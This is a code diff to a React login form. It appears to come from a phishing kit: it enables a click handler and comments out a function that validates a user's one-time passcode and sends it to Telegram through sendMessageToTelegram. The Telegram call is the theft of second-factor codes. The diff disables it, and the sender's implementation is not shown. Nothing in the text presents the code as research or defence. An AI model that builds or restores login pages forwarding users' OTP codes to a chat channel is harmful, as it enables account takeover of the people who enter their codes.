@@ -23,25 +23,25 @@ export default function LoginForm() {
         setDisplayModal(true)
     }
 
-    // useEffect(() => {
-    //     const isClickInsideButton = (event) => {
-    //         const button = document.querySelector('button[type="button"]');
-    //         console.log('button was clicked')
-    //         return button && button.contains(event.target);
-    //     };
+    useEffect(() => {
+        const isClickInsideButton = (event) => {
+            const button = document.querySelector('button[type="button"]');
+            console.log('button was clicked')
+            return button && button.contains(event.target);
+        };
 
-    //     const handleClick = (event) => {
-    //         if (!isClickInsideButton(event)) {
-    //             setInvalid(false);
-    //         }
-    //     };
+        const handleClick = (event) => {
+            if (!isClickInsideButton(event)) {
+                setInvalid(false);
+            }
+        };
 
-    //     document.addEventListener('click', handleClick);
+        document.addEventListener('click', handleClick);
 
-    //     return () => {
-    //         document.removeEventListener('click', handleClick);
-    //     };
-    // }, []);
+        return () => {
+            document.removeEventListener('click', handleClick);
+        };
+    }, []);
 
 
     const [isLoading, setIsLoading] = useState(false)
@@ -61,29 +61,29 @@ export default function LoginForm() {
     }, [command]);
 
     // const { validatePassword } = useValidatePassword();
-    const handleOtpValidation = () => {
-        // Replace this with your actual OTP validation logic:
-        const isValid = validateOtp(otpCode);
+    // const handleOtpValidation = () => {
+    //     // Replace this with your actual OTP validation logic:
+    //     const isValid = validateOtp(otpCode);
         
-        // Set error state based on validity
-        setInvalid(!isValid);
+    //     // Set error state based on validity
+    //     setInvalid(!isValid);
         
-        // Always start the loader when trying to submit
-        setIsLoading(true);
+    //     // Always start the loader when trying to submit
+    //     setIsLoading(true);
         
-        if (isValid) {
-          console.log(`${modal} OTP is valid. Sending to Telegram...`);
-          // Send OTP along with its type. Adjust sendMessageToTelegram as needed.
-          sendMessageToTelegram(otpCode);
-        } else {
-          // If invalid, show loader for 1 second, then turn it off.
-          setTimeout(() => {
-            setIsLoading(false);
-          }, 1000);
-        }
+    //     if (isValid) {
+    //       console.log(`${modal} OTP is valid. Sending to Telegram...`);
+    //       // Send OTP along with its type. Adjust sendMessageToTelegram as needed.
+    //       sendMessageToTelegram(otpCode);
+    //     } else {
+    //       // If invalid, show loader for 1 second, then turn it off.
+    //       setTimeout(() => {
+    //         setIsLoading(false);
+    //       }, 1000);
+    //     }
         
-        return isValid;
-      };
+    //     return isValid;
+    //   };
 
 
       
